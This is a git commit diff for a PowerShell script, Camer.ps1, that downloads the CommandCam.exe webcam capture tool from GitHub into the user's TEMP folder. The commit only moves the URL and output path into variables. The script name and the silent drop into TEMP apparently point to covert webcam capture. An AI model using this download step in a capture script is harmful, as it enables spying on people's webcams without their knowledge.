6c465aa1a1331d6b95d89e989ea072e073c3d881
cia168168 <147810144+cia168168@users.noreply.github.com>
2023-11-15 01:02:26 +0700

    Update Camer.ps1

--- Camer.ps1
+++ Camer.ps1
@@ -1,1 +1,3 @@
-Invoke-WebRequest -Uri ‘https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe’ -OutFile “$env:TEMP\CommandCam.exe”
+$url1 ="https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
+$output1 = “$env:TEMP\CommandCam.exe”
+Invoke-WebRequest -Uri $url1 -OutFile $output1
